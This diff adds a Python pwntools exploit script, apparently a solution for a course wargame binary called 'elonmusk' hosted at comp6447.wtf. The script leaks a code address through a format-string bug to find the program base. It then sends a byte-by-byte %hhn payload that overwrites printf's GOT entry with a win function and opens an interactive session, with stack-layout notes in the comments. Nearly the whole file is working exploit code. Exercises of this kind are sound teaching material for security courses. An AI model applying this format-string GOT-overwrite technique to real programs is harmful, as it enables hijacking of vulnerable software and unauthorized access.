@@ -1,0 +1,199 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# This exploit template was generated via:
+# $ pwn template
+from pwn import *
+import math
+
+# Set up pwntools for the correct architecture
+context.update(arch='i386')
+exe = './elonmusk' #Change this
+
+PROGNAME = exe
+REMOTE = "comp6447.wtf" #Change this
+REMOTEPORT = 6832 #Change this
+global p
+global e
+global global_timeout
+
+e = ELF(PROGNAME)
+
+# Many built-in settings can be controlled on the command-line and show up
+# in "args".  For example, to dump all data sent/received, and disable ASLR
+# for all created processes...
+# ./exploit.py DEBUG NOASLR
+
+
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if args.GDB:
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe] + argv, *a, **kw)
+
+# Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# ./exploit.py GDB
+gdbscript = '''
+continue
+'''.format(**locals())
+
+if args.REMOTE:
+    global_timeout = 3
+    p = remote(REMOTE, REMOTEPORT)
+else:
+    global_timeout = 0.5
+    p = process(PROGNAME)
+    p = start()
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+# Fibonacci checker
+def isPerfectSquare(x):
+    ret = int(math.sqrt(x))
+    return ret*ret == x
+
+def isFibonacci(x):
+    x = int(x)
+    return isPerfectSquare(5*x*x+4) or isPerfectSquare(5*x*x-4)
+
+def auto_gamble(x):
+    p.recvuntil(b': ', drop=True)
+    p.sendline("1")
+    p.recvuntil(b'1) ', drop=True)
+    one = p.recvline()
+    #log.info(one)
+    p.recvuntil(b'2) ', drop=True)
+    two = p.recvline()
+    #log.info(two)
+    p.recvuntil(b'3) ', drop=True)
+    three = p.recvline()
+    #log.info(three)
+    p.recvuntil(b'4) ', drop=True)
+    four = p.recvline()
+    #log.info(four)
+    p.recvuntil(b'5) ', drop=True)
+    five = p.recvline() 
+    #log.info(five)
+    p.recvuntil(b'> ', drop=True)
+    if not isFibonacci(one):
+        p.sendline("1")
+        #log.info("1")
+    elif not isFibonacci(two):
+        p.sendline("2")
+        #log.info("2")
+    elif not isFibonacci(three):
+        p.sendline("3")
+        #log.info("3")
+    elif not isFibonacci(four):
+        p.sendline("4")
+        #log.info("4")
+    else:
+        p.sendline("5")
+        #log.info("5")
+    p.recvuntil(b', ', drop=True)
+    if x == 1:
+        leak = p.recvuntil('!',drop=True)
+        p.recvuntil(b'continue...', drop=True)
+        p.sendline("a")
+        return leak
+    else:
+        
+        return
+
+p.recvuntil(b'> ', drop=True)
+payload = b'%3$p'
+p.sendline(payload)
+
+p.recvuntil(b'What will you do? ', drop=True)
+p.sendline("g")
+
+leak = auto_gamble(1)
+log.info(leak)
+
+# Checkpoint above functions leak printf vulnerability successfully
+# Inspect stack right before vulnerable printf is called
+#========================================================
+# 00:0000│ esp 0xffffcd70 —▸ 0xffffcd84 ◂— '%3$p'
+# 01:0004│     0xffffcd74 —▸ 0x56559ed4 (g_player+20) ◂— '%3$p'
+# 02:0008│     0xffffcd78 ◂— 0x100
+# 03:000c│     0xffffcd7c —▸ 0x56556ffc (do_gamble+295) ◂— sub    eax, 1
+# 04:0010│     0xffffcd80 —▸ 0xf7fdf2c9 (check_match+9) ◂— add    edi, 0x1dd37
+# 05:0014│ eax 0xffffcd84 ◂— '%3$p'
+# 06:0018│     0xffffcd88 ◂— 0x0
+#=======================================================
+# %1 is where g_player+20 is which stores our name
+# %2 shows 0x100
+# %3 shows the do_gamble functon address. We can use this to get our
+# offset for base
+# do_gamble offset is 0x1ed5
+base = int(leak, 16) - 295 - 0x1ed5
+log.info(hex(base))
+p.recvuntil(b'do? ', drop=True)
+# For some reason, we need to press twice
+p.sendline()
+p.sendline("c")
+p.recvline()
+# From GOT table, lets overwrite printf, offset = 0x4cd0
+win = base + 0x1537
+
+target = base + 0x4cd0
+log.info(hex(target))
+payload = p32(target)
+payload += p32(target + 1)
+payload += p32(target + 2)
+payload += p32(target + 3)
+
+win = str(hex(win))
+
+first_byte = win[8:]
+log.info(first_byte)
+first_byte = int(first_byte, 16)
+
+second_byte = win[6:8]
+log.info(second_byte)
+second_byte = int(second_byte, 16)
+
+third_byte = win[4:6]
+log.info(third_byte)
+third_byte = int(third_byte, 16)
+
+fourth_byte = win[2:4]
+log.info(fourth_byte)
+fourth_byte = int(fourth_byte, 16)
+
+fourth_byte = fourth_byte + 0x100 - third_byte
+third_byte = third_byte + 0x100 - second_byte
+second_byte = second_byte + 0x100 - first_byte
+first_byte = first_byte + 0x100 - len(payload)
+
+log.info(str(first_byte))
+log.info(str(second_byte))
+log.info(str(third_byte))
+log.info(str(fourth_byte))
+# We can't hardcode address since they change.
+
+#first_byte = u8(p32(win)[0]) + 0x100 - len(payload)
+
+payload += f"%{first_byte}x%5$hhn".encode()
+
+#second_byte = u8(p32(win)[1]) + 0x100 - u8(p32(win)[0])
+payload += f"%{second_byte}x%6$hhn".encode()
+
+#third_byte = u8(p32(win)[2]) + 0x100 - u8(p32(win)[1])
+payload += f"%{third_byte}x%7$hhn".encode()
+
+#fourth_byte = u8(p32(win)[3]) + 0x100 - u8(p32(win)[2])
+payload += f"%{fourth_byte}x%8$hhn".encode()
+
+p.sendline(payload)
+
+p.recvuntil(b'do? ', drop=True)
+p.sendline("g")
+auto_gamble(0)
+
+
+p.interactive()
+
+
+
